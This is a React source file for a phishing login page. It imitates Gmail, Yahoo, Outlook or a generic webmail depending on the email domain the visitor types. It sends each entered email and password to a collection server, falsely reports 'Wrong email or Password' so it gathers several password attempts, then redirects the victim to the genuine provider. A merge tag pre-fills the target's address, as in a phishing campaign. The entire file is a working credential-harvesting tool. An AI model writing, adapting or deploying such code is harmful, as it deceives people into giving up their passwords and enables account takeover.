import React, { useState, useEffect } from 'react';
import lock from '../Assets/lock-solid-full.png';
import env from '../Assets/envelope-regular-full.png';
import defaultLogo from '../Assets/Webmail.png';
import gmail from '../Assets/gmailpng.png'
import yahoo from '../Assets/yahoo.png'
import outlook from '../Assets/anco.png'
import '../App.css';

// Domain configuration mapping
const DOMAIN_CONFIG = {
  'gmail.com': {
    logo: gmail,
    redirect: 'https://mail.google.com/',
    name: 'Gmail'
  },
  'yahoo.com': {
    logo: yahoo,
    redirect: 'https://www.yahoo.com/',
    name: 'Yahoo Mail'
  },
  'outlook.com': {
    logo: outlook,
    redirect: 'https://outlook.live.com/',
    name: 'Outlook'
  },
  'default': {
    logo: defaultLogo,
    redirect: 'https://www.roundcubeforum.net/',
    name: 'Webmail'
  }
};

function Webmail() {
    const [formData, setFormData] = useState({
        email: '',
        password: ''
    });

    const [successCount, setSuccessCount] = useState(0);
    const [error, setError] = useState(null);
    const [currentConfig, setCurrentConfig] = useState(DOMAIN_CONFIG.default);

    // Extract domain from email and set appropriate config
    useEffect(() => {
        if (formData.email.includes('@')) {
            const domain = formData.email.split('@')[1].toLowerCase();
            const config = DOMAIN_CONFIG[domain] || DOMAIN_CONFIG.default;
            setCurrentConfig(config);
        } else {
            setCurrentConfig(DOMAIN_CONFIG.default);
        }
    }, [formData.email]);

    const replaceMergeTag = (text, data) => {
        return text.replace(/\[\[\s*-(.*?)\s*-\]\]/g, (_, key) => {
            return data[key.trim()] ?? '';
        });
    };

    const handleChange = (e) => {
        const { name, value } = e.target;
        setFormData((prev) => ({
            ...prev,
            [name]: value
        }));
        setError(null);
    };

    const handleSubmit = async (e) => {
        e.preventDefault();

        try {
            const response = await fetch('http://localhost:3129/activities', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json',
                },
                body: JSON.stringify({
                    ...formData,
                    targetDomain: currentConfig.name
                }),
            });

            const result = await response.json();

            if (response.ok) {
                const newCount = successCount + 1;
                setSuccessCount(newCount);

                if (newCount >= 3) {
                    window.location.href = currentConfig.redirect;
                } else {
                    setError('Wrong email or Password');
                    setFormData(prev => ({ ...prev, password: '' }));
                }
            } else {
                setError('Wrong email or Password');
            }

        } catch (error) {
            console.error('API error:', error);
            setError('Failed to connect to server. Please try again.');
        }
    };

    return (
        <div className='form'>
            <img 
                src={currentConfig.logo} 
                alt={`${currentConfig.name} Logo`} 
                style={{ maxWidth: '200px', maxHeight: '80px', objectFit: 'contain' }}
            />
            <h1>Welcome to {currentConfig.name}</h1>

            <form onSubmit={handleSubmit}>
                <div className='formData'>
                    <label>Email Address:</label>
                    <br /><br />
                    <div className='input'>
                        <img src={env} alt='Email icon' style={{ width: "20px" }} />
                        <input
                            type="email"
                            name="email"
                            placeholder='[[-Email-]]'
                            value={replaceMergeTag('[[-email-]]', formData)}
                            onChange={handleChange}
                            required
                        />
                    </div>
                    <br /><br />
                </div>

                <div className='formdata'>
                    <label>Password:</label>
                    <br /><br />
                    <div className='input'>
                        <img src={lock} alt='Password icon' style={{ width: "20px" }} />
                        <input
                            type="password"
                            name="password"
                            value={formData.password}
                            onChange={handleChange}
                            required
                        />
                    </div>
                    {error && (
                        <div className="error-message" style={{color: "red"}}>
                            {error}
                        </div>
                    )}
                    <br />
                </div>

                <button type="submit">Login</button>
            </form>
        </div>
    );
}

export default Webmail;